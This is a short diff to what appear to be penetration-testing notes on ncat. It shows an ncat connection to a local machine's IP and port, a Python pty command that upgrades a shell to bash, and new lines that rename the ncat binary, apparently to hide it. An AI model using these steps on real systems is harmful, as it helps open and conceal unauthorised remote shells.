@@ -32,8 +32,19 @@ ncat -nv <ip address of local box> <port>
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+# Changing the ncat binary
+### Rename the binary of ncat 
+```
+which ncat
+```
+```
+mv /usr/bin/ncat /usr/bin/<new name>
+```
+
 
 ### If ncat needs to be deleated
 ```
 sudo apt-get -y autoremove --purge ncat
 ```
+
+
